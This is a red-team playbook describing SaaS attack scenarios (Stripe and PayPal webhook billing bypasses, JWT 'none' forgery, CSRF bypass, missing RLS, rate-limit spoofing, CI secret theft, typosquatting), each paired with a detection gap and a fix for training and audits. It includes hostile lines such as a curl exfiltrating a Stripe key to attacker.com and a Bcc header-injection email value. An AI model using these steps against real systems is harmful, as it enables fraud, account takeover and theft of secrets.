# Attack Scenarios — Red Team Playbook

This file catalogs attack scenarios from real production SaaS audits, organized for
red-team walkthroughs. Each scenario includes: the goal, the setup, the step-by-step
attack, the detection gap, and the fix.

Use this for:
- Red team exercises
- Threat modeling workshops
- Training new security reviewers
- Post-incident "what would have worked" analysis
- Designing penetration tests

---

## Category A: Billing Bypass Scenarios

### A1. The $0 Premium via Stripe Metadata

**Goal:** Activate premium features without paying.

**Setup:** Target uses Stripe Checkout. Plan IDs validated against allowlist.
Webhook updates user subscription status on `checkout.session.completed`.

**Attack:**
1. Create a free Stripe account
2. Create a "Product" with a $0 price via Stripe API
3. Use the Stripe API (not the target's checkout) to create a session with:
   - `metadata.userId = "victim_user_id"` (attacker-controlled)
   - `client_reference_id = "victim_user_id"`
4. Complete the $0 "checkout" in attacker's Stripe account
5. Webhook fires. Handler reads `metadata.userId`, looks up user, activates premium.
6. Victim now has premium (attacker wanted to prove control; can redirect to own ID).

**Detection gap:** Webhook handler trusted metadata fields without verifying the
payment was to the TARGET's Stripe account.

**Fix:** Verify `event.account === TARGET_STRIPE_ACCOUNT_ID` before processing.
Fetch price/amount from Stripe API and validate against the expected plan's amount.

### A2. The PayPal custom_id Hijacking

**Goal:** Assign someone else's PayPal subscription to your account (or vice versa).

**Setup:** PayPal subscriptions use `custom_id` to link to internal user IDs.
Webhook handler trusts `custom_id` to update subscription status.

**Attack:**
1. Initiate PayPal checkout via API with `custom_id="victim_user_id"`
2. Complete payment with attacker's PayPal account
3. Webhook fires. Handler reads `custom_id`, looks up user, activates subscription.
4. Victim's account now linked to attacker's PayPal (attacker can now cancel victim's
   subscription, issue refunds, etc.)

**Detection gap:** `custom_id` is attacker-controllable. Handler didn't verify that
`payer_id` in the webhook matched the user's existing PayPal customerId.

**Fix:** `validatePayPalUserId()` cross-references `custom_id`, `payer_id`, and stored
`customerId`. Reject on mismatch. See [COOKBOOK.md](COOKBOOK.md) for full code.

### A3. The Refund-and-Use

**Goal:** Get service, refund the payment, keep the service.

**Setup:** Refunds processed via Stripe dashboard or API. App checks subscription
status via cached `subscriptionStatus` column.

**Attack:**
1. Pay for premium subscription
2. Use premium features for N days
3. Issue chargeback or refund via Stripe dashboard
4. Stripe webhook fires `charge.refunded`
5. App handler is missing or doesn't demote user
6. User retains premium indefinitely until manual intervention

**Detection gap:** `charge.refunded` event handler missing or incomplete. Subscription
status not recomputed on refund.

**Fix:** Handle ALL Stripe event types that affect entitlement:
`charge.refunded`, `charge.dispute.created`, `charge.dispute.funds_withdrawn`,
`invoice.payment_failed`, `customer.subscription.deleted`,
`customer.subscription.paused`. Each should trigger re-evaluation of entitlement.

### A4. The Trial Reset

**Goal:** Get unlimited free trial periods.

**Setup:** Trial limited to one per email. Email normalized at login but not at
trial registration.

**Attack:**
1. Sign up with `user@example.com`, get 14-day trial
2. Trial expires
3. Sign up with `user+1@example.com` — Gmail treats same, app treats different
4. Or: `USER@example.com` (case variation)
5. Or: `u.s.e.r@example.com` (Gmail dots)
6. Each gets a fresh 14-day trial

**Detection gap:** Trial uniqueness check compares raw email, not normalized.

**Fix:** Normalize email (lowercase, strip `+tag`, strip Gmail dots) before uniqueness
check. Use `unique index on lower(split_part(email, '+', 1))`. Also block common
disposable email domains.

### A5. The Seat Count Bypass

**Goal:** Add unlimited team members without triggering seat billing.

**Setup:** Team plan charges per seat. `maxSeats` checked in checkout flow.
Member addition done via `POST /api/team/members`.

**Attack:**
1. Start with paid team plan for 2 seats
2. Call `POST /api/team/members` repeatedly in parallel
3. No advisory lock on org row
4. All 100 concurrent requests pass the `count < maxSeats` check (TOCTOU)
5. 100 members added, billing still shows 2 seats

**Detection gap:** Seat check happens outside transaction with no row lock.

**Fix:** `SELECT ... FOR UPDATE` on org row inside transaction. Count is accurate
within the transaction. Subsequent concurrent requests block until first commits.

---

## Category B: Auth & Privilege Escalation Scenarios

### B1. The TOCTOU Admin Takeover

**Goal:** As a regular user, gain admin privileges during a narrow window.

**Setup:** Admin invitations happen via `POST /api/admin/invite`. Permission checked,
then insert.

**Attack:**
1. Attacker is a junior admin (can invite but not promote)
2. Attacker initiates "invite" request at T=0
3. Their admin role is revoked at T=0.5 by a senior admin
4. Permission check already passed (at T=0); insert happens at T=1 (after revocation)
5. Attacker's invite is processed as if they still had permission
6. Attacker invites themselves back as admin from a second account

**Detection gap:** Permission check was outside the database transaction.

**Fix:** Move permission check INSIDE transaction with `SELECT ... FOR UPDATE` on
the user's role row. Re-verify before the insert.

### B2. The Self-Healing Admin Escalation

**Goal:** Regain revoked admin privileges via email whitelist reconciliation.

**Setup:** `requireAdmin()` checks whitelist; if email whitelisted but `isAdmin`
false, auto-sets `isAdmin = true`.

**Attack:**
1. Ex-employee's admin access is manually revoked by setting `isAdmin = false`
2. Ex-employee's email is still in `ADMIN_EMAILS` env var
3. Ex-employee logs in (session valid, they still have user account)
4. `requireAdmin()` runs, sees whitelisted + not admin, auto-promotes
5. Ex-employee regains full admin access

**Detection gap:** Self-heal-up pattern undoes explicit revocations.

**Fix:** Remove auto-promotion. Whitelist gates login form only. Role changes are
durable state. Revocation persists.

### B3. The CSRF Bearer Bypass

**Goal:** Execute state-changing actions on behalf of victim via CSRF.

**Setup:** CSRF check skipped if `Authorization` header present (assumed API call).

**Attack:**
1. Craft a page with a form that POSTs to target
2. Add `Authorization: Bearer anything` header via XHR (or abuse a form submission
   bug that lets attacker control headers)
3. Target proxy sees `Authorization` header, skips CSRF check
4. Target then falls back to session cookie auth
5. Victim's session authorizes the request

**Detection gap:** Auth layer falls back to session when Authorization header
invalid, combined with CSRF bypass for presence of header.

**Fix:** Never fall back to session auth when Authorization header is present. If
header is invalid, return 401 — don't try session. OR: require Authorization header
format matches expected prefix (`jsm_`, `Bearer eyJ`) before bypassing CSRF.

### B4. The JWT None Algorithm

**Goal:** Forge a JWT for any user.

**Setup:** JWT validation uses a library that defaults to accepting `alg: none`.

**Attack:**
1. Obtain a valid JWT (your own, any user's)
2. Decode the header and payload
3. Change `alg` to `none`, payload `sub` to victim's ID
4. Strip the signature
5. Re-encode
6. Send as bearer token — some libraries accept it

**Detection gap:** JWT library defaults, or explicit `jwt.decode()` fallback for
"best effort" token inspection.

**Fix:** Explicit allowlist of algorithms: `jwt.verify(token, key, { algorithms:
['RS256'] })`. Never use `jwt.decode()` for security decisions.

### B5. The Password Reset via Email Header Injection

**Goal:** Inject `Bcc:` into password reset email to redirect the reset link.

**Setup:** User email is used in the email headers via string interpolation.

**Attack:**
1. Register with email: `victim@target.com\r\nBcc: attacker@evil.com`
2. Request password reset
3. Email service sends reset link to both addresses (if headers are interpolated
   without validation)
4. Attacker clicks the link first, resets password

**Detection gap:** Email validation accepts any format passing RFC-liberal regex.
Headers built via string interpolation instead of library.

**Fix:** Strict email validation rejecting newlines. Use email library's parameterized
header API, not string interpolation.

---

## Category C: Data Exposure Scenarios

### C1. The Missing RLS Core Table

**Goal:** Read all users' emails, subscription statuses, and billing info.

**Setup:** Supabase project. RLS enabled on most tables. Repair migration missed
`users` and `organizations` tables.

**Attack:**
1. Sign up for free account
2. Open browser devtools, find the Supabase anon key (exposed in `NEXT_PUBLIC_*`)
3. Use Supabase JS client directly (not the app's API)
4. `supabase.from('users').select('*')` — returns ALL users
5. `supabase.from('organizations').select('*')` — returns all billing data

**Detection gap:** RLS migration coverage not validated against full table inventory.

**Fix:** CI script runs `SELECT tablename FROM pg_tables WHERE schemaname = 'public'
EXCEPT SELECT DISTINCT tablename FROM pg_policies WHERE schemaname = 'public'`. Fail
build if any tables returned. See [scripts/rls-coverage.sql](../scripts/rls-coverage.sql).

### C2. The Aggregate Inference Leak

**Goal:** Infer other-tenant data from aggregate queries.

**Setup:** Multi-tenant SaaS with shared analytics. Admin dashboard shows global
"top users" list for internal use but the API is discoverable.

**Attack:**
1. Sign up for a second tenant
2. Call `/api/analytics/top-users` (or similar)
3. Response leaks usernames, activity counts, or revenue per user across ALL tenants
4. Use repeat queries to map the distribution

**Detection gap:** Aggregate endpoints checked "is authenticated" but not "is tenant
admin or cross-tenant role."

**Fix:** Every aggregate query scoped to the requesting tenant. Global aggregates
only exposed to cross-tenant admin role, and even then with noise/bucketing.

### C3. The Error Message Leak

**Goal:** Extract DB schema, internal paths, or user existence.

**Setup:** Errors returned to client include stack traces in production.

**Attack:**
1. Send malformed JSON to `/api/users/create`
2. Stack trace in response reveals:
   - Drizzle ORM version
   - File path `/app/src/lib/db/schema.ts:42`
   - Column name `stripeCustomerId`
3. Now attacker knows the schema, can craft more targeted attacks
4. Combine with SQL error messages to leak user data via error injection

**Detection gap:** `NODE_ENV !== 'production'` check missing in error handler.

**Fix:** Generic error response in production. Full errors only in logs. Error IDs
for support to correlate.

### C4. The OG-Image Data Exposure

**Goal:** Generate OG images that reveal other-tenant data.

**Setup:** OG image endpoint `/api/og?userId=X` fetches user data and renders a
preview image. No auth required (OG images need to work for scrapers).

**Attack:**
1. Enumerate user IDs (sequential, UUID guessable, or from public profile page)
2. Call `/api/og?userId=<any>`
3. Returns an image showing username, email, subscription status, or even more
4. Scrape all users' data via image metadata

**Detection gap:** OG endpoint was designed for public profiles but used internal
user lookup without filtering sensitive fields.

**Fix:** OG endpoints only include explicitly-public fields. Separate "public profile"
DB view used by the OG endpoint, never the full user row.

### C5. The Push Notification IDOR

**Goal:** Receive another user's push notifications (2FA codes, DMs).

**Setup:** Push subscriptions keyed by endpoint URL. App looks up by endpoint only.

**Attack:**
1. Attacker registers their own push subscription to an attacker-controlled endpoint
2. Attacker intercepts victim's registration request (via XSS or a phishing page)
3. Attacker sends victim's endpoint to app's `POST /api/push/register`
4. App stores: `(userId=attacker, endpoint=victim_endpoint)`
5. When app sends notifications to `victim_endpoint`, victim's browser receives them
6. BUT: if app looks up subscription by endpoint only (not endpoint + userId), attacker
   can claim victim's endpoint and receive their notifications instead.

**Detection gap:** Push subscription lookup by endpoint-only, not (endpoint, userId).

**Fix:** Primary key `(endpoint, userId)`. Verify ownership on every operation.

---

## Category D: Rate Limit & Abuse Scenarios

### D1. The Fail-Open DoS Escalation

**Goal:** Unlimited brute-force attempts on login.

**Setup:** Rate limiter uses Upstash Redis. Catches all errors and returns
`{ allowed: true }` for "graceful degradation."

**Attack:**
1. Identify Upstash instance (from DNS, Vercel dashboard, or errors)
2. DoS the Upstash endpoint (or wait for a natural outage)
3. Rate limiter errors on every call, returns `allowed: true`
4. Unlimited brute-force on login/signup/password reset

**Detection gap:** Fail-open on auth-critical rate limiter.

**Fix:** Fail-closed for auth endpoints. Accept a small amount of legitimate user
friction during Redis outages in exchange for brute-force protection. Alerting on
Redis error rate.

### D2. The Cookie Tier Spoof

**Goal:** Upgrade rate limit tier from "free" to "subscriber."

**Setup:** Rate limit tier determined by cookie presence: `if (cookies.has('sub_session'))
return 'subscriber';`.

**Attack:**
1. Set cookie `sub_session=whatever` via browser devtools
2. Rate limiter upgrades tier to "subscriber" (1000 req/min instead of 100)
3. Use the higher limit for scraping or brute-force

**Detection gap:** Tier determined by cookie presence, not validated session.

**Fix:** Rate limit tier derived from validated user session, not cookie presence.
If session validation is expensive, use a signed short-lived JWT that encodes tier.

### D3. The Header Spoof Tier Upgrade

**Goal:** Get admin-tier rate limits (bypass all restrictions).

**Setup:** Rate limiter exempts requests from trusted sources via IP check:
`if (req.ip === '10.0.0.5') skip limits`.

**Attack:**
1. Send request with `X-Forwarded-For: 10.0.0.5` or `X-Real-IP: 10.0.0.5`
2. Rate limiter trusts the header
3. Unlimited requests

**Detection gap:** `X-Forwarded-For` trusted without verifying upstream is trusted.

**Fix:** Trust `X-Forwarded-For` ONLY from known proxy IPs. Document the deployment
constraint (Vercel-only, Cloudflare-only). Never trust it on non-serverless.

### D4. The Enumeration via Rate Limit Timing

**Goal:** Enumerate valid usernames.

**Setup:** Login endpoint rate limits per-username (not per-IP), with identical
error messages for both cases.

**Attack:**
1. Attempt login for `alice` with bad password — goes through bcrypt, ~200ms
2. Attempt login for `nonexistent_user` — no bcrypt (no user), ~10ms
3. Timing difference reveals which usernames exist
4. Enumerate via timing side channel

**Detection gap:** Timing oracle because bcrypt only runs for existing users.

**Fix:** Always run bcrypt, even for nonexistent users (with a dummy hash). Constant-
time response regardless of which branch is taken.

---

## Category E: Supply Chain & Infrastructure Scenarios

### E1. The CI/CD Secret Extraction

**Goal:** Exfiltrate production secrets via a pull request.

**Setup:** GitHub Actions workflow runs on `pull_request`. Uses `secrets.STRIPE_KEY`
in a build step.

**Attack:**
1. Fork the repo
2. Open a PR that modifies the build step to run `curl attacker.com?key=$STRIPE_KEY`
3. Workflow runs on PR
4. Secret leaks to attacker

**Detection gap:** PR-triggered workflows with access to secrets.

**Fix:** Use `pull_request_target` only for approved workflows. Fork PRs get NO
secrets. See [gh-actions/references/SECURITY-CORE.md](../../gh-actions/references/SECURITY-CORE.md).

### E2. The Dependency Typosquat

**Goal:** Inject malicious code via a look-alike package.

**Setup:** Developer adds `reqeust` (typo of `request`) to package.json.

**Attack:**
1. Attacker registers npm package `reqeust` that looks like `request` but has a
   postinstall script
2. Developer runs `npm install`
3. Postinstall script exfiltrates `.env`, AWS credentials, npm tokens
4. Attacker now has production access

**Detection gap:** No dependency allowlist; no hash pinning; no postinstall review.

**Fix:** Lock file with hashes. `npm ci` instead of `npm install`. Disable postinstall
scripts: `npm install --ignore-scripts`. Dependency review via tools like `socket.dev`.

### E3. The Backup Snapshot Exposure

**Goal:** Read production DB via an accidentally public backup.

**Setup:** Automated backups to S3. Bucket policy "restrict to IAM role X," but
objects written with `public-read` ACL (default sometimes).

**Attack:**
1. Enumerate S3 buckets via `aws s3 ls` with anonymous credentials (or predictable
   naming: `company-backups-prod`, `company-db-dump-2026`)
2. Find buckets with `ListBucket` permission
3. Download `.sql.gz` dump files
4. Restore locally, browse data

**Detection gap:** Bucket policy restrictive but object-level ACL permissive. OR:
bucket policy intended for specific roles but allows `GetObject` to `*`.

**Fix:** `s3:PutObject` denied unless `x-amz-acl` matches private. Bucket policy
denies all `GetObject` except specific roles. Periodic audit via
`aws s3api get-bucket-policy`.

---

## How to Use Attack Scenarios

### Training
Use as flashcards. For each scenario, ask:
1. Without reading the fix, how would you detect this?
2. Without reading the setup, what category is this?
3. Can you name 3 variations of this attack?

### Red Team Exercises
Pick 3 scenarios per exercise. Timebox to 2 hours each. Document the hunt. If you
don't find it, why not? What detection would have caught it?

### Threat Modeling
For each feature, ask: "Which of these scenarios could apply?" If the answer is
"none," you probably missed some.

### Post-Incident
After a real incident, find the matching scenario (or add a new one). Document what
was different about your actual case.

### Audit Completeness
At the end of an audit, ask: "Did I check against each category (A-E)?" If you
haven't verified each category is impossible, you haven't finished the audit.
